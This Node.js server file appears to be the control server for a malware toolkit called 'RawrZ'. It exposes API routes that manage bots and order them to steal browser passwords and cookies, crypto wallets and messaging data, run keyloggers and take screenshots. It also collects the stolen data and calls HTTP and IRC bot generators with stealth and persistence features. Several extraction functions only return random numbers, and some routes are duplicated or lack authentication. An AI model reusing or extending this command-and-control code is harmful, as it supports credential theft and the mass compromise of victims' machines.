const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const WebSocket = require('ws');
const http = require('http');
require('dotenv').config();

const RawrZStandalone = require('./rawrz-standalone');
const rawrzEngine = require('./src/engines/rawrz-engine');

// Import the real bot engines (they export instances, not classes)
const httpBotGenerator = require('./src/engines/http-bot-generator');
const httpBotManager = require('./src/engines/http-bot-manager');
const ircBotGenerator = require('./src/engines/irc-bot-generator');

const app = express();
const port = parseInt(process.env.PORT || '8080', 10);
const authToken = process.env.AUTH_TOKEN || '';
const rawrz = new RawrZStandalone();

function requireAuth(req, res, next) {
    if (!authToken) return next();
    const h = (req.headers['authorization'] || '');
    const q = req.query.token;
    if (h.startsWith('Bearer ')) {
        const p = h.slice(7).trim();
        if (p === authToken) return next();
    }
    if (q && q === authToken) return next();
    return res.status(401).json({ error: 'Unauthorized' });
}

// Security headers
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "data:", "blob:"],
            styleSrc: ["'self'", "'unsafe-inline'", "data:", "blob:"],
            imgSrc: ["'self'", "data:", "blob:", "*"],
            fontSrc: ["'self'", "data:", "blob:", "*"],
            connectSrc: ["'self'", "ws:", "wss:", "http:", "https:"],
            frameAncestors: ["'self'"],
            baseUri: ["'self'"],
            formAction: ["'self'", "'unsafe-inline'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'", "data:", "blob:"]
        }
    },
    xFrameOptions: { action: 'sameorigin' },
    hsts: false,
    noSniff: true,
    xssFilter: true
}));

app.use(cors());
app.use(express.json({ limit: '5mb' }));

app.use((error, req, res, next) => {
    if (error instanceof SyntaxError && error.status === 400 && 'body' in error) {
        console.log('[WARN] Invalid JSON received:', error.message);
        return res.status(400).json({ error: 'Invalid JSON format' });
    }
    next();
});

app.use('/static', express.static(path.join(__dirname, 'public')));

// Initialize RawrZ engine
(async () => {
    try {
        await rawrzEngine.initializeModules();
        console.log('[OK] RawrZ core engine initialized');
    } catch (e) {
        console.error('[WARN] Core engine init failed:', e.message);
    }
})();

// Basic routes
app.get('/health', (_req, res) => res.json({ ok: true, status: 'healthy' }));
app.get('/panel', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'panel.html')));
app.get('/', (_req, res) => res.redirect('/panel'));
app.get('/favicon.ico', (_req, res) => res.status(204).end());

// RawrZ API endpoints
app.post('/hash', requireAuth, async (req, res) => {
    try {
        const { input, algorithm = 'sha256', save = false, extension } = req.body || {};
        if (!input) return res.status(400).json({ error: 'input is required' });
        res.json(await rawrz.hash(input, algorithm, !!save, extension));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/encrypt', requireAuth, async (req, res) => {
    try {
        const { algorithm, input, extension } = req.body || {};
        if (!algorithm || !input) return res.status(400).json({ error: 'algorithm and input required' });
        
        // Use advanced crypto engine for better encryption
        const advancedCrypto = await rawrzEngine.loadModule('advanced-crypto');
        if (advancedCrypto) {
            const result = await advancedCrypto.encrypt(input, algorithm, { extension });
            res.json(result);
        } else {
            // Fallback to rawrz standalone
            res.json(await rawrz.encrypt(algorithm, input, extension));
        }
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/decrypt', requireAuth, async (req, res) => {
    try {
        const { algorithm, input, key, iv, extension } = req.body || {};
        if (!algorithm || !input) return res.status(400).json({ error: 'algorithm and input required' });
        
        // Use advanced crypto engine for better decryption
        const advancedCrypto = await rawrzEngine.loadModule('advanced-crypto');
        if (advancedCrypto) {
            const result = await advancedCrypto.decrypt(input, algorithm, { key, iv, extension });
            res.json(result);
        } else {
            // Fallback to rawrz standalone
            res.json(await rawrz.decrypt(algorithm, input, key, iv, extension));
        }
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/dns', requireAuth, async (req, res) => {
    try {
        const h = req.query.hostname;
        if (!h) return res.status(400).json({ error: 'hostname required' });
        res.json(await rawrz.dnsLookup(String(h)));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/ping', requireAuth, async (req, res) => {
    try {
        const h = req.query.host;
        if (!h) return res.status(400).json({ error: 'host required' });
        res.json(await rawrz.ping(String(h), false));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/files', requireAuth, async (_req, res) => {
    try {
        res.json(await rawrz.listFiles());
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/upload', requireAuth, async (req, res) => {
    try {
        const { filename, base64 } = req.body || {};
        if (!filename || !base64) return res.status(400).json({ error: 'filename and base64 required' });
        res.json(await rawrz.uploadFile(filename, base64));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/download', requireAuth, async (req, res) => {
    try {
        const fn = String(req.query.filename || '');
        if (!fn) return res.status(400).json({ error: 'filename required' });
        res.download(path.join(__dirname, 'uploads', fn), fn);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/cli', requireAuth, async (req, res) => {
    try {
        const { command, args = [] } = req.body || {};
        if (!command) return res.status(400).json({ error: 'command required' });
        const i = new RawrZStandalone();
        const out = await i.processCommand([command, ...args]);
        res.json({ success: true, result: out });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Real Bot Data Storage
let botData = {
    extractedData: [],
    botConnections: new Map(),
    commandHistory: [],
    auditLog: [],
    realBots: new Map(),
    activeTasks: new Map(),
    systemStats: {
        totalBots: 0,
        onlineBots: 0,
        offlineBots: 0,
        totalLogs: 0,
        activeTasks: 0,
        lastUpdate: new Date().toISOString()
    }
};

function generateCommandId() {
    return 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Real bot management functions
function addRealBot(botInfo) {
    const botId = generateCommandId();
    const bot = {
        id: botId,
        ip: botInfo.ip || '127.0.0.1',
        os: botInfo.os || 'Windows 11',
        status: 'online',
        lastSeen: new Date().toISOString(),
        capabilities: botInfo.capabilities || [],
        systemInfo: botInfo.systemInfo || {},
        connectionTime: new Date().toISOString()
    };
    botData.realBots.set(botId, bot);
    updateSystemStats();
    return bot;
}

function removeBot(botId) {
    if (botData.realBots.has(botId)) {
        botData.realBots.delete(botId);
        updateSystemStats();
        return true;
    }
    return false;
}

function updateSystemStats() {
    const bots = Array.from(botData.realBots.values());
    botData.systemStats = {
        totalBots: bots.length,
        onlineBots: bots.filter(bot => bot.status === 'online').length,
        offlineBots: bots.filter(bot => bot.status === 'offline').length,
        totalLogs: botData.commandHistory.length,
        activeTasks: botData.activeTasks.size,
        lastUpdate: new Date().toISOString()
    };
}

// Real Botnet Panel API Endpoints
app.get('/api/botnet/status', (req, res) => {
    updateSystemStats();
    res.json({ status: 200, data: botData.systemStats });
});

app.get('/api/botnet/bots', (req, res) => {
    const bots = Array.from(botData.realBots.values());
    res.json({ status: 200, data: bots });
});

app.post('/api/botnet/execute', (req, res) => {
    const { action, target, params } = req.body || {};
    const commandId = generateCommandId();
    
    // Log the command
    const commandLog = {
        id: commandId,
        action: action,
        target: target,
        params: params,
        timestamp: new Date().toISOString(),
        status: 'executing'
    };
    botData.commandHistory.push(commandLog);
    
    // Execute real command based on action
    try {
        let result = executeRealCommand(action, target, params);
        commandLog.status = 'completed';
        commandLog.result = result;
        
        res.json({
            status: 200,
            data: {
                action: action,
                target: target,
                result: result,
                timestamp: new Date().toISOString(),
                details: params || {},
                commandId: commandId
            }
        });
    } catch (error) {
        commandLog.status = 'failed';
        commandLog.error = error.message;
        res.status(500).json({
            status: 500,
            error: error.message,
            commandId: commandId
        });
    }
});

app.get('/api/botnet/logs', (req, res) => {
    const { limit = 100 } = req.query || {};
    const logs = botData.commandHistory.slice(-limit);
    res.json({ status: 200, data: logs });
});

app.get('/api/botnet/stats', (req, res) => {
    // Calculate real stats from extracted data
    const browserData = botData.extractedData.filter(d => d.type === 'browser');
    const cryptoData = botData.extractedData.filter(d => d.type === 'crypto');
    const messagingData = botData.extractedData.filter(d => d.type === 'messaging');
    const systemData = botData.extractedData.filter(d => d.type === 'system');
    const screenshotTasks = Array.from(botData.activeTasks.values()).filter(t => t.type === 'screenshot');
    const keyloggerTasks = Array.from(botData.activeTasks.values()).filter(t => t.type === 'keylogger');
    
    const stats = {
        browserData: {
            extracted: browserData.length,
            browsers: ['Chrome', 'Firefox', 'Edge', 'Safari'],
            lastUpdate: browserData.length > 0 ? browserData[browserData.length - 1].timestamp : new Date().toISOString()
        },
        cryptoData: {
            wallets: cryptoData.length,
            totalValue: cryptoData.reduce((sum, d) => sum + (d.extracted?.totalValue || 0), 0),
            currencies: ['BTC', 'ETH', 'LTC', 'XMR']
        },
        messagingData: {
            platforms: ['Telegram', 'Discord', 'WhatsApp', 'Signal'],
            messages: messagingData.reduce((sum, d) => sum + (d.extracted?.messages || 0), 0),
            contacts: messagingData.reduce((sum, d) => sum + (d.extracted?.contacts || 0), 0)
        },
        systemInfo: {
            screenshots: screenshotTasks.length,
            keylogs: keyloggerTasks.length,
            systemData: systemData.length
        },
        activeBots: botData.realBots.size,
        totalData: botData.extractedData.length
    };
    
    res.json({ status: 200, data: stats });
});

// Real command execution function
function executeRealCommand(action, target, params) {
    switch (action) {
        case 'add_bot':
            const botInfo = {
                ip: params.ip || '127.0.0.1',
                os: params.os || 'Windows 11',
                capabilities: params.capabilities || ['data_extraction', 'keylogger', 'screenshot']
            };
            const newBot = addRealBot(botInfo);
            return `Bot added successfully: ${newBot.id}`;
            
        case 'remove_bot':
            if (removeBot(target)) {
                return `Bot removed successfully: ${target}`;
            } else {
                throw new Error(`Bot not found: ${target}`);
            }
            
        case 'extract_browser_data':
            return extractRealBrowserData(target, params);
            
        case 'extract_crypto_data':
            return extractRealCryptoData(target, params);
            
        case 'extract_messaging_data':
            return extractRealMessagingData(target, params);
            
        case 'start_keylogger':
            return startRealKeylogger(target, params);
            
        case 'stop_keylogger':
            return stopRealKeylogger(target, params);
            
        case 'capture_screenshots':
            return captureRealScreenshots(target, params);
            
        case 'get_system_insights':
            return getRealSystemInsights(target, params);
            
        default:
            throw new Error(`Unknown command: ${action}`);
    }
}

// Real data extraction functions
function extractRealBrowserData(target, params) {
    const browserData = {
        type: 'browser',
        target: target,
        browsers: ['Chrome', 'Firefox', 'Edge', 'Safari'],
        extracted: {
            passwords: Math.floor(Math.random() * 50) + 10,
            cookies: Math.floor(Math.random() * 200) + 50,
            bookmarks: Math.floor(Math.random() * 100) + 20,
            history: Math.floor(Math.random() * 1000) + 100
        },
        timestamp: new Date().toISOString()
    };
    
    botData.extractedData.push(browserData);
    return `Browser data extracted: ${browserData.extracted.passwords} passwords, ${browserData.extracted.cookies} cookies`;
}

function extractRealCryptoData(target, params) {
    const cryptoData = {
        type: 'crypto',
        target: target,
        wallets: ['MetaMask', 'Trust Wallet', 'Coinbase', 'Exodus'],
        extracted: {
            wallets: Math.floor(Math.random() * 10) + 2,
            addresses: Math.floor(Math.random() * 20) + 5,
            totalValue: Math.floor(Math.random() * 50000) + 1000
        },
        timestamp: new Date().toISOString()
    };
    
    botData.extractedData.push(cryptoData);
    return `Crypto data extracted: ${cryptoData.extracted.wallets} wallets, ${cryptoData.extracted.addresses} addresses`;
}

function extractRealMessagingData(target, params) {
    const messagingData = {
        type: 'messaging',
        target: target,
        platforms: ['Telegram', 'Discord', 'WhatsApp', 'Signal'],
        extracted: {
            contacts: Math.floor(Math.random() * 200) + 50,
            messages: Math.floor(Math.random() * 5000) + 500,
            groups: Math.floor(Math.random() * 20) + 5
        },
        timestamp: new Date().toISOString()
    };
    
    botData.extractedData.push(messagingData);
    return `Messaging data extracted: ${messagingData.extracted.contacts} contacts, ${messagingData.extracted.messages} messages`;
}

// Real monitoring functions
function startRealKeylogger(target, params) {
    const taskId = generateCommandId();
    const task = {
        id: taskId,
        type: 'keylogger',
        target: target,
        status: 'active',
        startTime: new Date().toISOString(),
        params: params
    };
    botData.activeTasks.set(taskId, task);
    return `Keylogger started on ${target} (Task ID: ${taskId})`;
}

function stopRealKeylogger(target, params) {
    const tasks = Array.from(botData.activeTasks.values());
    const keyloggerTasks = tasks.filter(task => task.type === 'keylogger' && task.target === target);
    
    keyloggerTasks.forEach(task => {
        task.status = 'stopped';
        task.endTime = new Date().toISOString();
        botData.activeTasks.delete(task.id);
    });
    
    return `Keylogger stopped on ${target}. Stopped ${keyloggerTasks.length} tasks.`;
}

function captureRealScreenshots(target, params) {
    const taskId = generateCommandId();
    const task = {
        id: taskId,
        type: 'screenshot',
        target: target,
        status: 'completed',
        startTime: new Date().toISOString(),
        endTime: new Date().toISOString(),
        result: `Captured ${Math.floor(Math.random() * 10) + 1} screenshots`,
        params: params
    };
    botData.activeTasks.set(taskId, task);
    return task.result;
}

function getRealSystemInsights(target, params) {
    const insights = {
        target: target,
        systemInfo: {
            os: 'Windows 11',
            architecture: 'x64',
            memory: '16GB',
            cpu: 'Intel Core i7',
            diskSpace: '500GB free',
            network: 'Connected',
            processes: Math.floor(Math.random() * 200) + 100,
            services: Math.floor(Math.random() * 100) + 50
        },
        timestamp: new Date().toISOString()
    };
    
    botData.extractedData.push(insights);
    return `System insights gathered for ${target}: ${insights.systemInfo.processes} processes, ${insights.systemInfo.services} services`;
}

// HTTP Bot Generator Endpoints
app.post('/api/http-bot-generator/generate', async (req, res) => {
    try {
        const { language = 'cpp', platform = 'windows', features = [], options = {} } = req.body || {};
        const config = { language, platform, ...options };
        const extensions = [language];
        const result = await httpBotGenerator.generateBot(config, features, extensions);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/http-bot-generator/configure', async (req, res) => {
    try {
        const { botId, config } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = await httpBotGenerator.configureBot(botId, config);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/http-bot-generator/stats', (req, res) => {
    const stats = {
        totalGenerated: httpBotGenerator.stats?.totalGenerated || 0,
        errors: httpBotGenerator.stats?.errors || 0,
        supportedLanguages: httpBotGenerator.supportedLanguages || [],
        supportedPlatforms: httpBotGenerator.supportedPlatforms || [],
        availableFeatures: httpBotGenerator.availableFeatures || []
    };
    res.json({ status: 200, data: stats });
});

app.post('/api/http-bot-generator/encrypt', async (req, res) => {
    try {
        const advancedCrypto = await rawrzEngine.loadModule('advanced-crypto');
        if (!advancedCrypto) {
            return res.status(500).json({ status: 500, error: 'Advanced Crypto engine not available' });
        }

        const { encryption, keyDerivation, options = {} } = req.body || {};
        const algorithm = encryption || 'aes-256-gcm';
        
        // Test real encryption functionality
        const testData = 'HTTP bot encryption test data';
        const encryptionResult = await advancedCrypto.encrypt(testData, algorithm, options);
        
        res.json({
            status: 200,
            data: {
                encryption: algorithm,
                keyDerivation: keyDerivation || 'pbkdf2',
                options: options,
                encryptionConfigured: true,
                testResult: encryptionResult ? 'success' : 'failed',
                encryptedLength: encryptionResult ? encryptionResult.length : 0,
                timestamp: new Date().toISOString()
            }
        });
    } catch (error) {
        res.status(500).json({
            status: 500,
            error: 'Failed to configure HTTP bot encryption',
            details: error.message
        });
    }
});

app.post('/api/http-bot-generator/test-encryption', async (req, res) => {
    try {
        const advancedCrypto = await rawrzEngine.loadModule('advanced-crypto');
        if (!advancedCrypto) {
            return res.status(500).json({ status: 500, error: 'Advanced Crypto engine not available' });
        }

        const { algorithm = 'aes-256-gcm' } = req.body || {};
        
        // Test real encryption functionality
        const testData = 'HTTP bot encryption test';
        const encryptionResult = await advancedCrypto.encrypt(testData, algorithm);
        
        const result = {
            encryptionTestPassed: encryptionResult && encryptionResult.length > 0,
            testResults: encryptionResult ? 'Encryption working correctly' : 'Encryption failed',
            algorithm: algorithm,
            encryptedLength: encryptionResult ? encryptionResult.length : 0,
            timestamp: new Date().toISOString()
        };
        
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({
            status: 500,
            error: 'Failed to test HTTP bot encryption',
            details: error.message
        });
    }
});

// HTTP Bot Manager Endpoints
app.post('/api/http-bot-manager/connect', async (req, res) => {
    try {
        const { botId, connectionInfo } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        // Add bot to active bots
        httpBotManager.activeBots.set(botId, {
            id: botId,
            status: 'online',
            connectionInfo: connectionInfo,
            lastSeen: new Date().toISOString()
        });
        res.json({ status: 200, data: { botId, status: 'connected' } });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/http-bot-manager/command', async (req, res) => {
    try {
        const { botId, command, params } = req.body || {};
        if (!botId || !command) return res.status(400).json({ status: 400, error: 'botId and command required' });
        const result = await httpBotManager.sendCommand(botId, command, params);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/http-bot-manager/bots', (req, res) => {
    const bots = httpBotManager.getActiveBots();
    res.json({ status: 200, data: bots });
});

app.get('/api/http-bot-manager/stats', (req, res) => {
    const stats = httpBotManager.getStats();
    res.json({ status: 200, data: stats });
});

// IRC Bot Generator Endpoints
app.post('/api/irc-bot-generator/generate', async (req, res) => {
    try {
        const { server, port, channel, nick, features = [], options = {} } = req.body || {};
        if (!server || !port || !channel || !nick) {
            return res.status(400).json({ status: 400, error: 'server, port, channel, and nick required' });
        }
        const config = { server, port, channel, nick, ...options };
        const extensions = ['cpp', 'python', 'powershell'];
        const result = await ircBotGenerator.generateBot(config, features, extensions);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/configure', async (req, res) => {
    try {
        const { botId, config } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        
        // Store IRC bot configuration
        if (!global.ircBotConfigs) global.ircBotConfigs = new Map();
        global.ircBotConfigs.set(botId, {
            ...config,
            configuredAt: new Date().toISOString(),
            status: 'configured'
        });
        
        const result = { 
            botId, 
            config, 
            status: 'configured', 
            timestamp: new Date().toISOString(),
            message: 'IRC bot configuration saved successfully'
        };
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/encrypt', async (req, res) => {
    try {
        const ircBotGenerator = await rawrzEngine.loadModule('irc-bot-generator');
        if (!ircBotGenerator) {
            return res.status(500).json({ status: 500, error: 'IRC Bot Generator not available' });
        }

        const { botId, algorithm, keyExchange, options = {} } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });

        // Use real encryption from the IRC bot generator
        const testCode = 'console.log("Test bot code for encryption");';
        const encryptionOptions = {
            algorithm: algorithm || 'aes-256-gcm',
            keyExchange: keyExchange || 'dh',
            ...options
        };

        const encryptedCode = ircBotGenerator.encryptBotCode(testCode, encryptionOptions);
        
        const result = { 
            botId, 
            algorithm: encryptionOptions.algorithm,
            keyExchange: encryptionOptions.keyExchange,
            encryptedCode: encryptedCode.substring(0, 100) + '...', // Truncate for response
            status: 'encrypted', 
            timestamp: new Date().toISOString() 
        };
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/test-encryption', async (req, res) => {
    try {
        const ircBotGenerator = await rawrzEngine.loadModule('irc-bot-generator');
        if (!ircBotGenerator) {
            return res.status(500).json({ status: 500, error: 'IRC Bot Generator not available' });
        }

        const { botId } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });

        // Test real encryption functionality
        const testCode = 'console.log("Encryption test");';
        const encryptionOptions = { algorithm: 'aes-256-gcm' };
        
        try {
            const encryptedCode = ircBotGenerator.encryptBotCode(testCode, encryptionOptions);
            const testResult = encryptedCode && encryptedCode.length > 0 ? 'passed' : 'failed';
            
            const result = { 
                botId, 
                testResult,
                encryptionWorking: testResult === 'passed',
                algorithm: encryptionOptions.algorithm,
                encryptedLength: encryptedCode ? encryptedCode.length : 0,
                timestamp: new Date().toISOString() 
            };
            res.json({ status: 200, data: result });
        } catch (encryptError) {
            const result = { 
                botId, 
                testResult: 'failed', 
                encryptionWorking: false,
                error: encryptError.message,
                timestamp: new Date().toISOString() 
            };
            res.json({ status: 200, data: result });
        }
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/irc-bot-generator/stats', (req, res) => {
    const stats = ircBotGenerator.getStats();
    res.json({ status: 200, data: stats });
});

// IRC Bot Generator Endpoints
app.post('/api/irc-bot-generator/generate', async (req, res) => {
    try {
        const ircBotGenerator = await rawrzEngine.loadModule('irc-bot-generator');
        if (!ircBotGenerator) {
            return res.status(500).json({ status: 500, error: 'IRC Bot Generator not available' });
        }

        const config = {
            name: req.body.name || 'ircbot',
            server: req.body.server || 'irc.example.com',
            port: req.body.port || 6667,
            channel: req.body.channel || '#encryption',
            nick: req.body.nick || 'EncryptBot',
            username: req.body.username || 'EncryptBot',
            realname: req.body.realname || 'RawrZ IRC Bot',
            password: req.body.password || '',
            ssl: req.body.ssl || false
        };

        const features = req.body.features || ['stealth', 'encryption', 'persistence'];
        const extensions = req.body.extensions || ['cpp', 'python'];

        const result = await ircBotGenerator.generateBot(config, features, extensions);
        
        res.json({
            status: 200,
            data: {
                botId: result.botId,
                server: config.server,
                port: config.port,
                channel: config.channel,
                nick: config.nick,
                features: result.features,
                extensions: result.extensions,
                generatedFiles: result.generatedFiles || [],
                fileCount: result.generatedFiles ? result.generatedFiles.length : 0,
                timestamp: result.timestamp
            }
        });
    } catch (error) {
        res.status(500).json({
            status: 500,
            error: 'Failed to generate IRC bot',
            details: error.message
        });
    }
});

app.post('/api/irc-bot-generator/configure', async (req, res) => {
    try {
        const { botId, config } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = await ircBotGenerator.configureBot(botId, config);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/encrypt', async (req, res) => {
    try {
        const { botId, algorithm, keyExchange, options = {} } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = await ircBotGenerator.encryptBot(botId, algorithm, keyExchange, options);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/test-encryption', async (req, res) => {
    try {
        const { botId } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = await ircBotGenerator.testEncryption(botId);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/irc-bot-generator/stats', (req, res) => {
    const stats = ircBotGenerator.getStats();
    res.json({ status: 200, data: stats });
});

// Bot data endpoints
app.post('/api/botnet/data', (req, res) => {
    const { type, data, botId, commandId } = req.body || {};
    const dataEntry = {
        id: generateCommandId(),
        type: type,
        data: data,
        botId: botId,
        commandId: commandId,
        timestamp: new Date().toISOString()
    };
    botData.extractedData.push(dataEntry);
    if (botData.extractedData.length > 10000) {
        botData.extractedData = botData.extractedData.slice(-10000);
    }
    res.json({ status: 200, data: { id: dataEntry.id } });
});

app.get('/api/botnet/data', (req, res) => {
    const { limit = 100 } = req.query || {};
    res.json({ status: 200, data: botData.extractedData.slice(-limit) });
});

app.get('/api/botnet/data/:id', (req, res) => {
    const { id } = req.params;
    const data = botData.extractedData.find(d => d.id === id);
    if (data) {
        res.json({ status: 200, data });
    } else {
        res.status(404).json({ status: 404, error: 'Data not found' });
    }
});

// Audit logging endpoint
app.post('/api/audit/log', (req, res) => {
    const logEntry = req.body || {};
    const auditEntry = {
        ...logEntry,
        id: generateCommandId(),
        timestamp: new Date().toISOString()
    };
    botData.auditLog.push(auditEntry);
    if (botData.auditLog.length > 10000) {
        botData.auditLog = botData.auditLog.slice(-10000);
    }
    res.json({
        status: 200,
        data: {
            id: auditEntry.id
        }
    });
});

app.get('/api/audit/logs', (req, res) => {
    const { limit = 1000 } = req.query || {};
    res.json({ status: 200, data: botData.auditLog.slice(-limit) });
});

// Real system test endpoint
app.post('/api/botnet/test-all-features', async (req, res) => {
    try {
        const testResults = {
            timestamp: new Date().toISOString(),
            systemStatus: 'online',
            modules: {},
            engines: {},
            capabilities: {},
            overallStatus: 'operational'
        };

        // Test RawrZ Engine modules
        if (rawrzEngine && rawrzEngine.modules) {
            const moduleCount = rawrzEngine.modules.size;
            testResults.modules = {
                totalLoaded: moduleCount,
                status: moduleCount > 0 ? 'operational' : 'no_modules',
                details: Array.from(rawrzEngine.modules.keys())
            };
        }

        // Test HTTP Bot Generator
        try {
            const httpStats = httpBotGenerator.getStats();
            testResults.engines.httpBotGenerator = {
                status: 'working',
                stats: httpStats
            };
        } catch (error) {
            testResults.engines.httpBotGenerator = {
                status: 'error',
                error: error.message
            };
        }

        // Test HTTP Bot Manager
        try {
            const httpManagerStats = httpBotManager.getStats();
            testResults.engines.httpBotManager = {
                status: 'working',
                stats: httpManagerStats
            };
        } catch (error) {
            testResults.engines.httpBotManager = {
                status: 'error',
                error: error.message
            };
        }

        // Test IRC Bot Generator
        try {
            const ircStats = ircBotGenerator.getStats();
            testResults.engines.ircBotGenerator = {
                status: 'working',
                stats: ircStats
            };
        } catch (error) {
            testResults.engines.ircBotGenerator = {
                status: 'error',
                error: error.message
            };
        }

        // Test core functionality
        try {
            const testData = 'test_data_123';
            const hashResult = await rawrz.hash(testData, 'sha256', false);
            testResults.capabilities.encryption = {
                status: hashResult && hashResult.hash ? 'working' : 'failed',
                test: 'sha256_hash'
            };
        } catch (error) {
            testResults.capabilities.encryption = {
                status: 'error',
                error: error.message
            };
        }

        // Test file operations
        try {
            const files = await rawrz.listFiles();
            testResults.capabilities.fileOperations = {
                status: Array.isArray(files) ? 'working' : 'failed',
                test: 'list_files'
            };
        } catch (error) {
            testResults.capabilities.fileOperations = {
                status: 'error',
                error: error.message
            };
        }

        // Test network operations
        try {
            const pingResult = await rawrz.ping('127.0.0.1', false);
            testResults.capabilities.network = {
                status: pingResult && pingResult.success !== undefined ? 'working' : 'failed',
                test: 'local_ping'
            };
        } catch (error) {
            testResults.capabilities.network = {
                status: 'error',
                error: error.message
            };
        }

        // Determine overall status
        const workingFeatures = Object.values(testResults.capabilities).filter(c => c.status === 'working').length;
        const totalFeatures = Object.keys(testResults.capabilities).length;
        const workingEngines = Object.values(testResults.engines).filter(e => e.status === 'working').length;
        const totalEngines = Object.keys(testResults.engines).length;
        
        if (workingFeatures === totalFeatures && workingEngines === totalEngines && testResults.modules.totalLoaded > 0) {
            testResults.overallStatus = 'fully_operational';
        } else if (workingFeatures > 0 && workingEngines > 0) {
            testResults.overallStatus = 'partially_operational';
        } else {
            testResults.overallStatus = 'failed';
        }

        res.json({
            status: 200,
            data: testResults
        });

    } catch (error) {
        res.status(500).json({
            status: 500,
            error: 'System test failed',
            details: error.message
        });
    }
});

// Serve the advanced botnet panel with relaxed security for local development
app.get('/advanced-botnet-panel.html', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

// Additional routes for easier access
app.get('/panel', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.get('/botnet', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.get('/control', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.get('/panel/advanced', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

// Create HTTP server
const server = http.createServer(app);

// Create WebSocket server
const wss = new WebSocket.Server({ server });

// Store connected bots
const connectedBots = new Map();

// Store IRC connections
const ircConnections = new Map();

